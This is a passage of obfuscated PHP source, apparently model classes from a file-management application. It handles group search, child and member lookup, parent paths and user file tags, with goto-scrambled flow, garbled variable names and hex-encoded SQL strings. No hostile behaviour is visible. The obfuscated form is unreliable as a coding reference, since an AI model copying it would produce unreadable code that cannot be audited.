$f¼¤èÛÓ‘» =& $_SERVER[ÈİÅ¿ÈÈ¥×]; if (!$Eè¬Ê«·Îæ) { return array(); } $eÆ£Ë¥Å… = array($f¼¤èÛÓ‘»[1650] => array($f¼¤èÛÓ‘»[7], $Eè¬Ê«·Îæ)); $d»¸¹‰ë¤¬ = $this->where($eÆ£Ë¥Å…)->select(); $this->_listDataApply($d»¸¹‰ë¤¬); return $d»¸¹‰ë¤¬; } public function listSearch($fÇ¾²ÃøÛ) { goto fìÄñÂÅÙê; c×óœÁÊò: if (!trim($CÚ é‚áÚ)) { return !1; } $CÚ é‚áÚ = str_replace($F×¥…Æ¬Èç[1737], $F×¥…Æ¬Èç[1738], $CÚ é‚áÚ); $fÜ‰î½­ = array($F×¥…Æ¬Èç[1650] => array($F×¥…Æ¬Èç[373], "{$CÚ é‚áÚ}\45"), $F×¥…Æ¬Èç[28] => array($F×¥…Æ¬Èç[373], "\45{$CÚ é‚áÚ}\45"), $F×¥…Æ¬Èç[922] => $F×¥…Æ¬Èç[1739]); goto FœçéÕÓ¬¡; e›äÇ„¥‚½: return $A¨Âî§¹Î©; goto CÔŒä™½‘ ; Eâˆ¾¦«ĞÒ: $A¨Âî§¹Î© = $A¨Âî§¹Î© ? $A¨Âî§¹Î© : array(); if (!$A¨Âî§¹Î© || count($A¨Âî§¹Î©[$F×¥…Æ¬Èç[361]]) < 5 && Input::check($CÚ é‚áÚ, $F×¥…Æ¬Èç[312])) { goto Eî³ââ”; DĞŠ‚ˆ¬™: $A¨Âî§¹Î©[$F×¥…Æ¬Èç[358]][$F×¥…Æ¬Èç[360]] = ceil($A¨Âî§¹Î©[$F×¥…Æ¬Èç[358]][$F×¥…Æ¬Èç[359]] / $A¨Âî§¹Î©[$F×¥…Æ¬Èç[358]][$F×¥…Æ¬Èç[356]]); goto C¬–‡Ë­Ó°; B×ˆß†ƒŒÏ: $bõñçÈêÇÚ = array_merge($fË²—Ùš×“, $d´‹ô¶˜ˆŠ, $A¨Âî§¹Î©[$F×¥…Æ¬Èç[361]]); $A¨Âî§¹Î©[$F×¥…Æ¬Èç[361]] = array_unique_by_key($bõñçÈêÇÚ, $F×¥…Æ¬Èç[1650]); $A¨Âî§¹Î©[$F×¥…Æ¬Èç[358]][$F×¥…Æ¬Èç[359]] = count($A¨Âî§¹Î©[$F×¥…Æ¬Èç[361]]); goto DĞŠ‚ˆ¬™; Eî³ââ”: $bŞ©öñßºí = $this->groupChildrenAll($CÒÑõÍŞ—¥); $fË²—Ùš×“ = $this->_searchFromMeta($F×¥…Æ¬Èç[431], $CÚ é‚áÚ, 10, $bŞ©öñßºí); $d´‹ô¶˜ˆŠ = $this->_searchFromMeta($F×¥…Æ¬Èç[432], $CÚ é‚áÚ, 10, $bŞ©öñßºí); goto B×ˆß†ƒŒÏ; C¬–‡Ë­Ó°: } $this->_listDataApply($A¨Âî§¹Î©[$F×¥…Æ¬Èç[361]]); goto e›äÇ„¥‚½; FœçéÕÓ¬¡: if ($CÒÑõÍŞ—¥) { $F¢óãª±èñ = $this->getInfoSimple($CÒÑõÍŞ—¥); $cùÆ ºİÏí = $F¢óãª±èñ[$F×¥…Æ¬Èç[476]] . $CÒÑõÍŞ—¥ . $F×¥…Æ¬Èç[501]; $fÜ‰î½­ = array($fÜ‰î½­, array($F×¥…Æ¬Èç[476] => array($F×¥…Æ¬Èç[373], $cùÆ ºİÏí))); } $fÜ‰î½­ = $this->parseWhereLike($fÜ‰î½­); $A¨Âî§¹Î© = $this->_makeOrder()->where($fÜ‰î½­)->selectPage(20); goto Eâˆ¾¦«ĞÒ; fìÄñÂÅÙê: $F×¥…Æ¬Èç =& $_SERVER[ÈİÅ¿ÈÈ¥×]; $CÚ é‚áÚ = $fÇ¾²ÃøÛ[$F×¥…Æ¬Èç[1735]]; $CÒÑõÍŞ—¥ = isset($fÇ¾²ÃøÛ[$F×¥…Æ¬Èç[1736]]) ? $fÇ¾²ÃøÛ[$F×¥…Æ¬Èç[1736]] : !1; goto c×óœÁÊò; CÔŒä™½‘ : } protected function groupChildrenAll($eŒ‚Ø„†«ë) { $f¡¹¯¥Îİ =& $_SERVER[ÈİÅ¿ÈÈ¥×]; if (!$eŒ‚Ø„†«ë) { return !1; } if (is_string($eŒ‚Ø„†«ë)) { $eŒ‚Ø„†«ë = array($eŒ‚Ø„†«ë); } $aŠ·”®éë = $eŒ‚Ø„†«ë; foreach ($eŒ‚Ø„†«ë as $EÃéÄµÀ‚») { $añ‹È£‹¢Ü = $this->getInfoSimple($EÃéÄµÀ‚»); $E¯¹‰²ŒÃ = array($f¡¹¯¥Îİ[476] => array($f¡¹¯¥Îİ[373], $añ‹È£‹¢Ü[$f¡¹¯¥Îİ[476]] . $EÃéÄµÀ‚» . $f¡¹¯¥Îİ[501])); $f‚–‡‹ôò½ = $this->field($f¡¹¯¥Îİ[1650])->where($E¯¹‰²ŒÃ)->select(); $aŠ·”®éë = array_merge($aŠ·”®éë, array_to_keyvalue($f‚–‡‹ôò½, $f¡¹¯¥Îİ[33], $f¡¹¯¥Îİ[1650])); } return array_unique($aŠ·”®éë); } private function _searchFromMeta($a„£•Åâ×, $dÌÃ¬™‚¾ğ, $BÓª›‰ê, $c‡ºËÒ°œ›) { goto fÅ¿ä„ñŠÒ; Cµ­À³•: if (!$B¾ê¼ÉÁ˜¿) { return array(); } $B¾ê¼ÉÁ˜¿ = array_to_keyvalue($B¾ê¼ÉÁ˜¿, $A¼ç›çÀô[33], $A¼ç›çÀô[1650]); $Càˆ…’¿’˜ = $this->where(array($A¼ç›çÀô[1731] => array($A¼ç›çÀô[7], $B¾ê¼ÉÁ˜¿)))->select(); goto D¯âøÓåó; D¯âøÓåó: if (!$Càˆ…’¿’˜) { return array(); } return $Càˆ…’¿’˜; goto a™ÌÃ†ƒ¥; A¸îÉ¯¦³: $B˜™ïåğ…Ú = $this->parseWhereLike($B˜™ïåğ…Ú); if ($c‡ºËÒ°œ›) { $B˜™ïåğ…Ú[$A¼ç›çÀô[1650]] = array($A¼ç›çÀô[7], $c‡ºËÒ°œ›); } $B¾ê¼ÉÁ˜¿ = Model($A¼ç›çÀô[1740])->where($B˜™ïåğ…Ú)->limit($BÓª›‰ê)->select(); goto Cµ­À³•; fÅ¿ä„ñŠÒ: $A¼ç›çÀô =& $_SERVER[ÈİÅ¿ÈÈ¥×]; $dÌÃ¬™‚¾ğ = strtolower($dÌÃ¬™‚¾ğ); $B˜™ïåğ…Ú = array($A¼ç›çÀô[89] => $a„£•Åâ×, $A¼ç›çÀô[366] => array($A¼ç›çÀô[373], "\45{$dÌÃ¬™‚¾ğ}\45")); goto A¸îÉ¯¦³; a™ÌÃ†ƒ¥: } protected function _listDataApplyItem($D‹Ìì–¨Àº) { $aèÂ×«Ÿòô = array($D‹Ìì–¨Àº); $this->_listDataApply($aèÂ×«Ÿòô); return $aèÂ×«Ÿòô[0]; } protected function _listDataApply(&$c›ª†óøª¨) { goto eá°ÌÅœ©Ï; a‰ÜŒµíÇÔ: $this->_listAppendParent($c›ª†óøª¨); $this->_listAppendSourceRoot($c›ª†óøª¨, $C¼¯¡î·ë¤); goto E…òÁé¦ÎË; eá°ÌÅœ©Ï: $E˜ÜÃ”É—ë =& $_SERVER[ÈİÅ¿ÈÈ¥×]; if (!$c›ª†óøª¨) { return; } $C¼¯¡î·ë¤ = array_to_keyvalue($c›ª†óøª¨, $E˜ÜÃ”É—ë[33], $E˜ÜÃ”É—ë[1650]); goto c‡ª›¡ğš›; c‡ª›¡ğš›: $this->_listAppendChildren($c›ª†óøª¨); $this->_listAppendChildrenMember($c›ª†óøª¨); $this->_listAppendMeta($c›ª†óøª¨, $C¼¯¡î·ë¤); goto a‰ÜŒµíÇÔ; E…òÁé¦ÎË: } private function _listAppendChildren(&$BŒ“İ†‰è¸) { goto DÏÀ©ÚáÖ; DÏÀ©ÚáÖ: $FÄî©Ñ”–Ë =& $_SERVER[ÈİÅ¿ÈÈ¥×]; $c•Ÿ¥è«ñ = $FÄî©Ñ”–Ë[368]; $FŞŞï³âë = array(); goto A´°ÕŠé–ê; A´°ÕŠé–ê: $E‰­™Á˜îˆ = count($BŒ“İ†‰è¸); $bŸ…™•Ş¾ñ = $this->tablePrefix . $this->tableName; for ($A”Ñ†šÉÒô = 0, $d¥±ëâ£·Ñ = 0; $A”Ñ†šÉÒô < $E‰­™Á˜îˆ; $A”Ñ†šÉÒô++) { $d¥±ëâ£·Ñ++; $F†ç‘÷ø±» = $BŒ“İ†‰è¸[$A”Ñ†šÉÒô][$FÄî©Ñ”–Ë[1650]]; $c•Ÿ¥è«ñ .= "\123\105\x4c\x45\103\x54\40\52\40\106\x52\117\115\x20\x28\x53\x45\114\105\103\124\x20\47{$F†ç‘÷ø±»}\137\143\x68\x69\154\144\x27\x20\141\x73\40\x68\141\163\40\x46\x52\x4f\x4d\40\x60{$bŸ…™•Ş¾ñ}\140\40\x77\x68\145\x72\x65\40\160\x61\x72\x65\x6e\164\x49\x44\75{$F†ç‘÷ø±»}\x20\154\x69\x6d\151\x74\40\61\51\x20\141\x73\40\x74\142\x5f{$F†ç‘÷ø±»}\40\x75\156\x69\x6f\x6e\40\141\x6c\x6c\40"; if (($d¥±ëâ£·Ñ >= 20 || $A”Ñ†šÉÒô == $E‰­™Á˜îˆ - 1) && $c•Ÿ¥è«ñ) { $c•Ÿ¥è«ñ = substr($c•Ÿ¥è«ñ, 0, -strlen($FÄî©Ñ”–Ë[466])); $AİÄµ¡ = $this->query($c•Ÿ¥è«ñ); $FŞŞï³âë = array_merge($FŞŞï³âë, $AİÄµ¡); $d¥±ëâ£·Ñ = 0; $c•Ÿ¥è«ñ = $FÄî©Ñ”–Ë[33]; } } goto aŞç„·¿; aŞç„·¿: $FŞŞï³âë = array_to_keyvalue($FŞŞï³âë, $FÄî©Ñ”–Ë[467]); foreach ($BŒ“İ†‰è¸ as &$e«¼¼÷‹°¥) { $e«¼¼÷‹°¥[$FÄî©Ñ”–Ë[1741]] = isset($FŞŞï³âë[$e«¼¼÷‹°¥[$FÄî©Ñ”–Ë[1650]] . $FÄî©Ñ”–Ë[1742]]); } unset($e«¼¼÷‹°¥); goto bø£ŞÔì”ù; bø£ŞÔì”ù: } private function _listAppendChildrenMember(&$eÙ³“‹ÒŸÚ) { goto aâ®æÏéöé; aâ®æÏéöé: $aÆòè¨ãÓ­ =& $_SERVER[ÈİÅ¿ÈÈ¥×]; $b†ù‰¡Òğ = $aÆòè¨ãÓ­[368]; $b³×‹±Õêä = array(); goto D‰ˆ˜”Ğ¿…; D‰ˆ˜”Ğ¿…: $a×ªÒ—ó¨ = count($eÙ³“‹ÒŸÚ); $BÒ‚¿“óƒ¬ = $this->tablePrefix . $aÆòè¨ãÓ­[1733]; for ($bå£™Š®ä = 0, $b®ï§ğáµ£ = 0; $bå£™Š®ä < $a×ªÒ—ó¨; $bå£™Š®ä++) { $b®ï§ğáµ£++; $fÖ¹ì‚“Ïâ = $eÙ³“‹ÒŸÚ[$bå£™Š®ä][$aÆòè¨ãÓ­[1650]]; $b†ù‰¡Òğ .= "\x53\105\114\105\103\x54\x20\52\x20\x46\122\x4f\115\40\x28\123\105\114\105\x43\124\x20\x27{$fÖ¹ì‚“Ïâ}\x5f\x63\150\151\154\144\x27\40\141\x73\x20\150\x61\x73\40\106\x52\x4f\x4d\x20\140{$BÒ‚¿“óƒ¬}\140\x20\x77\x68\x65\162\x65\40\x67\162\157\165\160\x49\104\x3d{$fÖ¹ì‚“Ïâ}\x20\x6c\x69\155\x69\164\x20\x31\x29\x20\141\163\x20\164\142\x5f{$fÖ¹ì‚“Ïâ}\40\165\156\x69\157\x6e\40\141\154\154\x20"; if (($b®ï§ğáµ£ >= 20 || $bå£™Š®ä == $a×ªÒ—ó¨ - 1) && $b†ù‰¡Òğ) { $b†ù‰¡Òğ = substr($b†ù‰¡Òğ, 0, -strlen($aÆòè¨ãÓ­[466])); $C³£¤®ÌÀØ = $this->query($b†ù‰¡Òğ); $b³×‹±Õêä = array_merge($b³×‹±Õêä, $C³£¤®ÌÀØ); $b®ï§ğáµ£ = 0; $b†ù‰¡Òğ = $aÆòè¨ãÓ­[33]; } } goto D„Ó“—ÎÒ¦; D„Ó“—ÎÒ¦: $b³×‹±Õêä = array_to_keyvalue($b³×‹±Õêä, $aÆòè¨ãÓ­[467]); foreach ($eÙ³“‹ÒŸÚ as &$a»í§œ¿°½) { $a»í§œ¿°½[$aÆòè¨ãÓ­[1743]] = isset($b³×‹±Õêä[$a»í§œ¿°½[$aÆòè¨ãÓ­[1650]] . $aÆòè¨ãÓ­[1742]]); } unset($a»í§œ¿°½); goto E…ÕÆ Êôè; E…ÕÆ Êôè: } private function _listAppendMeta(&$eŸ˜¢ÂôÜâ, $C¿í¡òª¤¡) { goto C“¸À¥­…°; aéì£³ù»Š: $Bì¼ï¸èš = array_to_keyvalue_group($Bì¼ï¸èš, $Få¸„»‚âÍ[1650]); foreach ($Bì¼ï¸èš as &$eó„½ò¿¨Ç) { $eó„½ò¿¨Ç = array_to_keyvalue($eó„½ò¿¨Ç, $Få¸„»‚âÍ[89], $Få¸„»‚âÍ[366]); } unset($eó„½ò¿¨Ç); goto e»ŒææÎ®‡; e»ŒææÎ®‡: foreach ($eŸ˜¢ÂôÜâ as &$CÑ¸õÆŠë) { $CÑ¸õÆŠë[$Få¸„»‚âÍ[433]] = array(); if (isset($Bì¼ï¸èš[$CÑ¸õÆŠë[$Få¸„»‚âÍ[1650]]])) { $CÑ¸õÆŠë[$Få¸„»‚âÍ[433]] = $Bì¼ï¸èš[$CÑ¸õÆŠë[$Få¸„»‚âÍ[1650]]]; } } unset($CÑ¸õÆŠë); goto dÅÈÑ¤¸é; C“¸À¥­…°: $Få¸„»‚âÍ =& $_SERVER[ÈİÅ¿ÈÈ¥×]; $c—ØÈÎµ’Ó = array($Få¸„»‚âÍ[1650] => array($Få¸„»‚âÍ[7], $C¿í¡òª¤¡)); $Bì¼ï¸èš = Model($Få¸„»‚âÍ[1732])->where($c—ØÈÎµ’Ó)->select(); goto aéì£³ù»Š; dÅÈÑ¤¸é: } protected function parentLevelArray($EÏ°¹éŒ“) { $aˆÔ¾‹ÓÒ¡ =& $_SERVER[ÈİÅ¿ÈÈ¥×]; $EÏ°¹éŒ“ = explode($aˆÔ¾‹ÓÒ¡[47], trim($EÏ°¹éŒ“, $aˆÔ¾‹ÓÒ¡[47])); $EÏ°¹éŒ“ = array_remove_value($EÏ°¹éŒ“, $aˆÔ¾‹ÓÒ¡[485]); return $EÏ°¹éŒ“; } private function _listAppendParent(&$B„Ó­¶ç“²) { goto f”éóò¶é¬; Cãœ¯ƒÃ“”: unset($F…‹ ÈÍØ·); $d˜ìƒº˜Ö = array(); foreach ($FøŠØ²ˆšÌ as $DÕœÏ„Ûš÷ => $BöĞ¨¼ôæ) { if (!$BöĞ¨¼ôæ) { $d˜ìƒº˜Ö[] = $DÕœÏ„Ûš÷; } } goto E…Ü‘¦…Š½; cÉ³àİË¥ï: unset($F…‹ ÈÍØ·); goto Dœø”ªïè; f”éóò¶é¬: $e”¬à¤Æ‘Ê =& $_SERVER[ÈİÅ¿ÈÈ¥×]; $FøŠØ²ˆšÌ = array(); foreach ($B„Ó­¶ç“² as &$F…‹ ÈÍØ·) { $FøŠØ²ˆšÌ[$F…‹ ÈÍØ·[$e”¬à¤Æ‘Ê[1650]]] = $F…‹ ÈÍØ·[$e”¬à¤Æ‘Ê[28]]; $dÒ‰–å½ˆ  = $this->parentLevelArray($F…‹ ÈÍØ·[$e”¬à¤Æ‘Ê[476]]); foreach ($dÒ‰–å½ˆ  as $fÏ¸œ¦¨æÊ) { if (!isset($FøŠØ²ˆšÌ[$fÏ¸œ¦¨æÊ])) { $FøŠØ²ˆšÌ[$fÏ¸œ¦¨æÊ] = 0; } } } goto Cãœ¯ƒÃ“”; E…Ü‘¦…Š½: if ($d˜ìƒº˜Ö) { $aÍß–óëÌ = array($e”¬à¤Æ‘Ê[1731] => array($e”¬à¤Æ‘Ê[400], $d˜ìƒº˜Ö)); $dÆòĞ·Ü— = $this->field($e”¬à¤Æ‘Ê[1744])->where($aÍß–óëÌ)->select(); $B¾¶Ü˜à· = array_to_keyvalue($dÆòĞ·Ü—, $e”¬à¤Æ‘Ê[1650], $e”¬à¤Æ‘Ê[28]); $FøŠØ²ˆšÌ = array_merge_index($FøŠØ²ˆšÌ, $B¾¶Ü˜à·); } $Cé ªÛ©ÓÍ = $GLOBALS[$e”¬à¤Æ‘Ê[6]][$e”¬à¤Æ‘Ê[84]][$e”¬à¤Æ‘Ê[1745]]; foreach ($B„Ó­¶ç“² as &$F…‹ ÈÍØ·) { $dÒ‰–å½ˆ  = $this->parentLevelArray($F…‹ ÈÍØ·[$e”¬à¤Æ‘Ê[476]]); $D××‡åÃö« = $e”¬à¤Æ‘Ê[33]; foreach ($dÒ‰–å½ˆ  as $DÕœÏ„Ûš÷ => $fÏ¸œ¦¨æÊ) { if ($Cé ªÛ©ÓÍ && $DÕœÏ„Ûš÷ == 0) { continue; } $D××‡åÃö« .= $FøŠØ²ˆšÌ[$fÏ¸œ¦¨æÊ] . $e”¬à¤Æ‘Ê[8]; } if ($dÒ‰–å½ˆ ) { $D××‡åÃö« .= $F…‹ ÈÍØ·[$e”¬à¤Æ‘Ê[28]]; } $F…‹ ÈÍØ·[$e”¬à¤Æ‘Ê[480]] = str_replace($e”¬à¤Æ‘Ê[484], $e”¬à¤Æ‘Ê[8], $D××‡åÃö«); } goto cÉ³àİË¥ï; Dœø”ªïè: } private function _listAppendSourceRoot(&$a¢ùŞğä…, $b ¢Æô·®Š) { goto BŞŠ†È˜‹ë; BŞŠ†È˜‹ë: $f»ÍîêŞÛâ =& $_SERVER[ÈİÅ¿ÈÈ¥×]; $c­À‰ìîˆ = array($f»ÍîêŞÛâ[387] => SourceModel::TYPE_GROUP, $f»ÍîêŞÛâ[478] => 0, $f»ÍîêŞÛâ[473] => array($f»ÍîêŞÛâ[7], $b ¢Æô·®Š)); $e¦¿¼¼áÔ… = $f»ÍîêŞÛâ[1746]; goto còßÊÇôŒÔ; F‰šìÖÜÈñ: foreach ($a¢ùŞğä… as &$DÃÚ“àŸô) { $DÃÚ“àŸô[$f»ÍîêŞÛâ[407]] = $cÉ›´·‡ã÷[$DÃÚ“àŸô[$f»ÍîêŞÛâ[1650]]] ? $cÉ›´·‡ã÷[$DÃÚ“àŸô[$f»ÍîêŞÛâ[1650]]] : array(); } unset($DÃÚ“àŸô); goto FŒƒƒáÒöô; còßÊÇôŒÔ: $cÉ›´·‡ã÷ = Model($f»ÍîêŞÛâ[759])->order($f»ÍîêŞÛâ[1747])->field($e¦¿¼¼áÔ…)->where($c­À‰ìîˆ)->select(); $cÉ›´·‡ã÷ = array_to_keyvalue($cÉ›´·‡ã÷, $f»ÍîêŞÛâ[473]); $cÉ›´·‡ã÷ = array_remove_key($cÉ›´·‡ã÷, $f»ÍîêŞÛâ[473]); goto F‰šìÖÜÈñ; FŒƒƒáÒöô: } protected function groupMerge($ešª™¿ëô) { $ešª™¿ëô = array_values(array_unique($ešª™¿ëô)); $C×£ï®â¶ = array(); for ($FÔ±ò–ŒùÌ = 0; $FÔ±ò–ŒùÌ < count($ešª™¿ëô); $FÔ±ò–ŒùÌ++) { $Dİß©ªš­ß = !1; for ($cíãÜ÷Şœ = 0; $cíãÜ÷Şœ < count($ešª™¿ëô); $cíãÜ÷Şœ++) { if ($FÔ±ò–ŒùÌ == $cíãÜ÷Şœ) { continue; } if ($this->isParentOf($ešª™¿ëô[$cíãÜ÷Şœ], $ešª™¿ëô[$FÔ±ò–ŒùÌ])) { $Dİß©ªš­ß = !0; break; } } if (!$Dİß©ªš­ß) { $C×£ï®â¶[] = $ešª™¿ëô[$FÔ±ò–ŒùÌ]; } } return $C×£ï®â¶; } protected function isParentOf($BŠ—†ííñß, $f÷õ—‹±ƒ‡) { goto C°Ó¡ èŸ; b÷÷åİø…: return !1; goto C¸ÏÚªÕ¦Ï; bñÂÉ¼Á¾ä: $cÁˆèÂÖƒ = $this->getInfoSimple($f÷õ—‹±ƒ‡); $bÍÏ„è´Š¡ = $F½³ØĞƒºğ[$B£Ë´ø­‘[476]] . $BŠ—†ííñß . $B£Ë´ø­‘[47]; if (substr($cÁˆèÂÖƒ[$B£Ë´ø­‘[476]], 0, strlen($bÍÏ„è´Š¡)) == $bÍÏ„è´Š¡) { return !0; } goto b÷÷åİø…; C°Ó¡ èŸ: $B£Ë´ø­‘ =& $_SERVER[ÈİÅ¿ÈÈ¥×]; if (!$BŠ—†ííñß || !$f÷õ—‹±ƒ‡ || $BŠ—†ííñß == $f÷õ—‹±ƒ‡) { return !1; } $F½³ØĞƒºğ = $this->getInfoSimple($BŠ—†ííñß); goto bñÂÉ¼Á¾ä; C¸ÏÚªÕ¦Ï: } public function groupShowRoot($c¨·ïÅ­’…, $C¾ŸØãîİ = false) { goto BÏ¼õßŒÚ; fê‚¢¢¿µò: return $eööš»¬ô; goto a¹Å‹æŸ…; aÖ­ç‚à’: $Dí¦åå–‰Ö = $this->parentLevelArray($c‰ÄÁäÁØ†[$a™ØŠÕ»Œ[476]]); $eööš»¬ô = array($c¨·ïÅ­’…); if (count($Dí¦åå–‰Ö) == 0) { return $eööš»¬ô; } goto A«Ò ›; A«Ò ›: if ($C¾ŸØãîİ && count($Dí¦åå–‰Ö) == 1) { return $eööš»¬ô; } if (!$c‰ÄÁäÁØ†[$a™ØŠÕ»Œ[433]] || !isset($c‰ÄÁäÁØ†[$a™ØŠÕ»Œ[433]][$a™ØŠÕ»Œ[1729]]) || $c‰ÄÁäÁØ†[$a™ØŠÕ»Œ[433]][$a™ØŠÕ»Œ[1729]] == $a™ØŠÕ»Œ[1702]) { return $this->groupShowRoot($Dí¦åå–‰Ö[count($Dí¦åå–‰Ö) - 1], $C¾ŸØãîİ); } if ($c‰ÄÁäÁØ†[$a™ØŠÕ»Œ[433]][$a™ØŠÕ»Œ[1729]] == $a™ØŠÕ»Œ[353]) { $FáÄñ¼œ = explode($a™ØŠÕ»Œ[47], $c‰ÄÁäÁØ†[$a™ØŠÕ»Œ[433]][$a™ØŠÕ»Œ[1730]]); if ($FáÄñ¼œ) { $eööš»¬ô = array_merge($eööš»¬ô, $FáÄñ¼œ); } } goto fê‚¢¢¿µò; BÏ¼õßŒÚ: $a™ØŠÕ»Œ =& $_SERVER[ÈİÅ¿ÈÈ¥×]; $c‰ÄÁäÁØ† = $this->getInfo($c¨·ïÅ­’…); if (!$c‰ÄÁäÁØ†) { return array(); } goto aÖ­ç‚à’; a¹Å‹æŸ…: } protected function resetParentLevel() { $dÃã¥ÑìÒÙ =& $_SERVER[ÈİÅ¿ÈÈ¥×]; $dµŠÏ¿Ëøƒ = $dÃã¥ÑìÒÙ[1650]; $cå…ËÊ²• = $this->select(); $cå…ËÊ²• = array_to_keyvalue($cå…ËÊ²•, $dµŠÏ¿Ëøƒ); foreach ($cå…ËÊ²• as $EÂÖÀìˆ) { goto F š„Õà¹; F š„Õà¹: $aÃÏ¤°²ñÑ = $EÂÖÀìˆ; $F‚àİŞ„‚‡ = array(); while ($aÃÏ¤°²ñÑ[$dÃã¥ÑìÒÙ[478]] != 0) { $F‚àİŞ„‚‡[] = $aÃÏ¤°²ñÑ[$dÃã¥ÑìÒÙ[478]]; $aÃÏ¤°²ñÑ = $cå…ËÊ²•[$aÃÏ¤°²ñÑ[$dÃã¥ÑìÒÙ[478]]]; } goto cÆõá¬‚Ì; C«´ î©¦ì: $this->where(array($dµŠÏ¿Ëøƒ => $EÂÖÀìˆ[$dµŠÏ¿Ëøƒ]))->save(array($dÃã¥ÑìÒÙ[542] => $F‚àİŞ„‚‡)); goto cÑóÌ¤¼Úƒ; cÆõá¬‚Ì: $F‚àİŞ„‚‡[] = 0; $F‚àİŞ„‚‡ = $dÃã¥ÑìÒÙ[47] . implode($dÃã¥ÑìÒÙ[47], array_reverse($F‚àİŞ„‚‡)) . $dÃã¥ÑìÒÙ[47]; $this->setNamePinyin($EÂÖÀìˆ[$dµŠÏ¿Ëøƒ], $EÂÖÀìˆ[$dÃã¥ÑìÒÙ[28]]); goto C«´ î©¦ì; cÑóÌ¤¼Úƒ: } return $cå…ËÊ²•; } public function groupNameAuto($d˜…ŒºÓ”, $e ’ÉÛªÜé) { $AÍÊ“Ââ„‚ =& $_SERVER[ÈİÅ¿ÈÈ¥×]; $eŒ…İš¨óä = $this->where(array($AÍÊ“Ââ„‚[384] => $d˜…ŒºÓ”))->getField($AÍÊ“Ââ„‚[28], !0); if (!$eŒ…İš¨óä || !in_array($e ’ÉÛªÜé, $eŒ…İš¨óä)) { return $e ’ÉÛªÜé; } for ($E³´Ü®‰ßº = 1; $E³´Ü®‰ßº <= count($eŒ…İš¨óä) + 1; $E³´Ü®‰ßº++) { $f¡®â……ƒÊ = $e ’ÉÛªÜé . "\50{$E³´Ü®‰ßº}\x29"; if (!in_array($f¡®â……ƒÊ, $eŒ…İš¨óä)) { return $f¡®â……ƒÊ; } } } } goto EÌ” ÒËÁ·; DØÒÇ½ôÚ£: class UserTagSourceModel extends ModelBase { protected $tableName = "\165\x73\x65\162\x5f\146\141\166"; protected function cacheFunctionAlias($FßÒÔéÄ¼) { $eÉÛİµÙà =& $_SERVER[ÈİÅ¿ÈÈ¥×]; return array($eÉÛİµÙà[1750] => array(USER_ID, $eÉÛİµÙà[1751])); } protected function listData() { $C‹Œ°è»ˆ =& $_SERVER[ÈİÅ¿ÈÈ¥×]; $bÂ™§â¾·Ş = array($C‹Œ°è»ˆ[1482] => USER_ID, $C‹Œ°è»ˆ[451] => array($C‹Œ°è»ˆ[1754], 0)); $fÖ¾ÃÕ¹… = $C‹Œ°è»ˆ[1756]; $Aƒ˜˜ºó¯ = $this->field($fÖ¾ÃÕ¹…)->where($bÂ™§â¾·Ş)->order($C‹Œ°è»ˆ[1757])->select(); return $Aƒ˜˜ºó¯ ? $Aƒ˜˜ºó¯ : array(); } protected function listByTag($EÊ´¾½šò) { } protected function addToTag($B£ø»Ç Ğ®, $e¢å‚éà¢õ) { $EÔÖ÷Ğøäß =& $_SERVER[ÈİÅ¿ÈÈ¥×]; if (!Model($EÔÖ÷Ğøäß[1895])->listData($e¢å‚éà¢õ) || !Model($EÔÖ÷Ğøäß[759])->pathInfo($B£ø»Ç Ğ®)) { return !1; } $f×²¸İÏà³ = array($EÔÖ÷Ğøäß[1482] => USER_ID, $EÔÖ÷Ğøäß[451] => $e¢å‚éà¢õ, $EÔÖ÷Ğøäß[403] => $B£ø»Ç Ğ®, $EÔÖ÷Ğøäß[404] => $EÔÖ÷Ğøäß[398], $EÔÖ÷Ğøäß[402] => $EÔÖ÷Ğøäß[33], $EÔÖ÷Ğøäß[1654] => 0); if ($this->where($f×²¸İÏà³)->find()) { return !1; } return $this->add($f×²¸İÏà³); } protected function removeFromTag($a·¦˜Ûó„, $aÍæï–ØïŠ) { $DçÇ¥ŠÜ—‹ =& $_SERVER[ÈİÅ¿ÈÈ¥×]; if (!Model($DçÇ¥ŠÜ—‹[1895])->listData($aÍæï–ØïŠ)) { return !1; } if (is_array($a·¦˜Ûó„)) { $a·¦˜Ûó„ = array($DçÇ¥ŠÜ—‹[7], $a·¦˜Ûó„); } $DµÇóá¬ = array($DçÇ¥ŠÜ—‹[1482] => USER_ID, $DçÇ¥ŠÜ—‹[451] => $aÍæï–ØïŠ, $DçÇ¥ŠÜ—‹[404] => $DçÇ¥ŠÜ—‹[398], $DçÇ¥ŠÜ—‹[403] => $a·¦˜Ûó„); return $this->where($DµÇóá¬)->delete(); } protected function removeByTag($fË‡¬‹Ø„¾) { $dˆãÏç­©µ =& $_SERVER[ÈİÅ¿ÈÈ¥×]; if (!$fË‡¬‹Ø„¾) { return !1; } $b¯ĞÀ‡‚Ú§ = array($dˆãÏç­©µ[1482] => USER_ID, $dˆãÏç­©µ[451] => $fË‡¬‹Ø„¾); return $this->where($b¯ĞÀ‡‚Ú§)->delete(); } protected function removeBySource($AğÂµÏ®¶¸) { $C²æÔùã¦ =& $_SERVER[ÈİÅ¿ÈÈ¥×]; if (is_array($AğÂµÏ®¶¸)) { $AğÂµÏ®¶¸ = array($C²æÔùã¦[7], $AğÂµÏ®¶¸); } $d§Ã°·‹Ï = array($C²æÔùã¦[1482] => USER_ID, $C²æÔùã¦[403] => $AğÂµÏ®¶¸, $C²æÔùã¦[451] => array($C²æÔùã¦[936], 0)); return $this->where($d§Ã°·‹Ï)->delete(); } }